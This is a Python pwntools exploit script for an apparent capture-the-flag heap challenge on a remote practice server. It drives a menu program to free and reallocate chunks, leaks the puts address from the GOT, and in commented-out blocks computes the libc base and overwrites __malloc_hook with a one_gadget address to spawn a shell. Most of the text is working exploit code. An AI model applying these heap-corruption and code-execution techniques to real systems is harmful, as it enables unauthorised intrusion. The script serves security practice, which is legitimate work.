from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

one_gadgets = [0x45216, 0x4526A, 0xF02A4, 0xF1147]

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27127)
elf = ELF('./pwn')

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)

def add(basize, nasize, bacon, nacon):
	sla(b'> Now please tell me what you want to do :', b'1')
	sla(b'> ba\'s length : ', str(basize).encode())
	sa(b'> ba : ', bacon)
	sla(b'> na\'s length : ', str(nasize).encode())
	sa(b'> na : ', nacon)
	
def delete(idx):
	sla(b'> Now please tell me what you want to do :', b'3')
	sla(b'> Banana ID : ', str(idx).encode())
	
def show(idx):
	sla(b'> Now please tell me what you want to do :', b'4')
	sla(b'> SCP project ID : ', str(idx).encode())
	
add(0x60, 0x60, b'a\n', b'a\n')		# 0
add(0x60, 0x60, b'a\n', b'a\n')		# 1
delete(0)
delete(1)
add(0x18, 0x18, p64(elf.got['puts']) + p64(0x6020A8), b'a')	# 2
show(0)

'''
io.recvuntil(b'Banana\'s ba is ')
puts = u64(io.recv(6) + b'\x00\x00')
log.info('puts: ' + hex(puts))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
__malloc_hook = base + libc.dump('__malloc_hook')
'''

'''
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
base = puts - libc.symbols['puts']
system = base + libc.symbols['system']
__malloc_hook = base + libc.symbols['__malloc_hook']
'''

'''
io.recvuntil('Banana\'s na is ')
heap_addr = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
log.info('system: ' + hex(system))
log.info('heap addr: ' + hex(heap_addr))

add(0x60, 0x60, b'a\n', b'a\n')		# 3
add(0x60, 0x60, b'a\n', b'a\n')		# 4
delete(3)
delete(4)
add(0x18, 0x18, p64(heap_addr + 0x10) + p64(heap_addr + 0x110), b'b')	# 5
add(0x60, 0x60, b'a\n', b'a\n')		# 6
delete(6)
delete(3)

add(0x60, 0x60, b'a\n', p64(__malloc_hook - 0x23))	# 7
add(0x60, 0x60, b'a\n', b'a\n')	# 8
add(0x60, 0x50, b'b' * 19 + p64(one_gadgets[3]), b'/bin/sh\n')	# 9
# add(0x18, 0x18, b'a\n', p64(system))
# delete(7)
# gdb.attach(io, 'b *0x400C24')
# time.sleep(3)

io.interactive()
'''
